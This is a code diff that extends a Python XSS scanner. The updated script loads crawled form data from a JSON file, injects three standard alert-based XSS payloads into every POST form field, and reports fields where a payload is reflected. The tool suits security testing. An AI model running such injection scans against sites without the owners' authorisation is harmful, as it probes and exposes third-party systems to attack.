@@ -1,26 +1,43 @@
 import requests
+import json
 
-target_url = input("Enter the target URL (e.g., http://example.com/comment): ")
-vulnerable_param = input("Enter the vulnerable parameter name (e.g., comment): ")
+# Load mapped website data
+with open("mapped_data.json", "r") as f:
+    mapped_data = json.load(f)
 
+# XSS Payloads
 xss_payloads = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
     "<svg onload=alert('XSS')>"
 ]
 
-print(f"\n🔍 Scanning {target_url} for XSS vulnerabilities...\n")
+print("\n🔍 Scanning for XSS vulnerabilities...\n")
 
-for payload in xss_payloads:
-    print(f"Testing: {payload}")
-    
-    # Send POST request (since the comment form expects POST)
-    data = {vulnerable_param: payload}
-    response = requests.post(target_url, data=data)
+# Iterate over all discovered forms
+for entry in mapped_data:
+    if entry["method"] == "POST" and entry["inputs"]:  # Ensure form has inputs
+        target_url = entry["url"]
+        print(f"📌 Testing: {target_url}")
 
-    # Check if the payload is reflected in the response
-    if payload in response.text:
-        print(f"XSS Vulnerability Detected with Payload: {payload}")
-        break
-else:
-    print("No XSS vulnerabilities detected.")
+        # Test each input field
+        for param in entry["inputs"]:
+            print(f"🛠️  Testing parameter: {param}")
+
+            for payload in xss_payloads:
+                print(f"🚀 Injecting: {payload}")
+                data = {param: payload}
+
+                try:
+                    response = requests.post(target_url, data=data)
+
+                    # Check if the payload is reflected in the response
+                    if payload in response.text:
+                        print(f"⚠️  XSS Vulnerability Detected in {target_url}!")
+                        print(f"🛡️  Vulnerable Parameter: {param}")
+                        print(f"🚀 Payload: {payload}\n")
+                        break  # Stop testing if we find an issue
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+
+print("\n✅ Scan complete!")
